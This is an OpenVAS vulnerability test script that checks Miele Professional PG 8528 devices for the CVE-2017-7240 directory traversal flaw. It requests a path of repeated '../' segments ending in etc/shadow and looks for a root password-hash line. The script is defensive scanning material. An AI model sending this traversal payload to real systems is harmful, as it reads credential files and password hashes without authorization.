###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_miele_pst10_dir_trav_vuln.nasl 5756 2017-03-29 06:43:44Z cfi $
#
# Miele Professional PG 8528 Directory Traversal Vulnerability
#
# Authors:
# Christian Fischer <christian.fischer@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108109");
  script_version("$Revision: 5756 $");
  script_cve_id("CVE-2017-7240");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-03-29 08:43:44 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2017-03-29 07:49:40 +0200 (Wed, 29 Mar 2017)");
  script_name("Miele Professional PG 8528 Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2017 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("PST10/banner");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2017/Mar/63");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/41718/");

  script_tag(name:"summary", value:"This host is running a Miele Professional PG 8528
  and is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read local file or not.");

  script_tag(name:"impact", value:"Successful exploitation will allow
  remote attackers to read arbitrary files on the target system.

  Impact Level: System/Application");

  script_tag(name:"solution", value:"No solution or patch is available as of 29th March, 2017. Information
  regarding this issue will be updated once the solution details are available.");

  script_tag(name:"qod_type", value:"remote_active");
  script_tag(name:"solution_type", value:"NoneAvailable");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
banner = get_http_banner( port:port );
if( "Server: PST10 WebServer" >!< banner ) exit( 0 );

url = "/" + crap( data:"../", length:3 * 12 ) + "etc/shadow";

if( shadow = http_vuln_check( port:port, url:url, pattern:"root:.*:0:" ) ) {
  line = egrep( pattern:'root:.*:0:', string:shadow );
  line = chomp( line );
  report = 'By requesting "' + report_vuln_url( port:port, url:url, url_only:TRUE ) + '" it was possible to retrieve the content\nof /etc/shadow.\n\n[...] ' + line + ' [...]\n';
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );